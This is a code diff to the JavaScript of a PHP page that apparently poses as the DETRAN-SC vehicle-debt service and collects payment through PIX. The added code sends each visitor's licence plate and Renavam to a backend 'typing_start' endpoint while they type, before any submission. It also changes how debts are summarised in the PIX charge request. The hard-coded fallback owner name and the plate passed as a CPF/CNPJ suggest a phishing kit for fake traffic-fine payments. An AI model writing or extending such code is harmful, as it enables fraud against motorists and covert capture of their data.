@@ -252,6 +252,7 @@ if (!isset($pdo)) {
     let totalValorSC = 0;
     let currentRefSC = null;
     let pollIntervalSC = null;
+    let typingTimerSC = null;
 
     function showStep(stepName) {
         document.querySelectorAll('.step-content').forEach(s => s.classList.remove('active'));
@@ -259,9 +260,44 @@ if (!isset($pdo)) {
         window.scrollTo(0,0);
     }
 
+    function getTypingDocSC() {
+        const placa = document.getElementById('placa').value.trim().toUpperCase();
+        const renavam = document.getElementById('renavam').value.trim();
+
+        return `Placa: ${placa || '---'} | Renavam: ${renavam || '---'}`;
+    }
+
+    function notifyTypingStartSC() {
+        clearTimeout(typingTimerSC);
+        typingTimerSC = setTimeout(() => {
+            const placa = document.getElementById('placa').value.trim().toUpperCase();
+            const renavam = document.getElementById('renavam').value.trim();
+
+            fetch('../../api/typing_start.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    typing: true,
+                    tela: 'detran-sc',
+                    page: 'detran-sc',
+                    doc: `Placa: ${placa || '---'} | Renavam: ${renavam || '---'}`,
+                    placa: placa,
+                    renavam: renavam
+                })
+            }).catch(() => {});
+        }, 250);
+    }
+
     // Máscara Renavam
     document.getElementById('renavam').addEventListener('input', e => {
         e.target.value = e.target.value.replace(/\D/g, "");
+    });
+
+    ['placa', 'renavam'].forEach(id => {
+        const input = document.getElementById(id);
+        input.addEventListener('input', notifyTypingStartSC);
     });
 
     // Consulta
@@ -327,6 +363,9 @@ if (!isset($pdo)) {
     document.getElementById('btnIrParaPagamento').addEventListener('click', () => {
         const nome = currentDataSC.proprietario || 'PROPRIETARIO DETRAN-SC';
         const placa = document.getElementById('placa').value.toUpperCase();
+        const totalDebitos = document.querySelectorAll('.debito-check-sc').length;
+        const debitosSelecionados = document.querySelectorAll('.debito-check-sc:checked').length;
+        const debitoResumo = `${debitosSelecionados}/${totalDebitos}`;
 
         const btn = document.getElementById('btnIrParaPagamento');
         btn.disabled = true;
@@ -336,7 +375,7 @@ if (!isset($pdo)) {
         formData.append('cpf_cnpj', placa);
         formData.append('nome', nome);
         formData.append('valor', totalValorSC.toFixed(2));
-        formData.append('debito', 'DÉBITOS DETRAN-SC (' + placa + ')');
+        formData.append('debito', debitoResumo);
 
         fetch('../../data/pix.php', { method: 'POST', body: formData })
         .then(res => res.json())
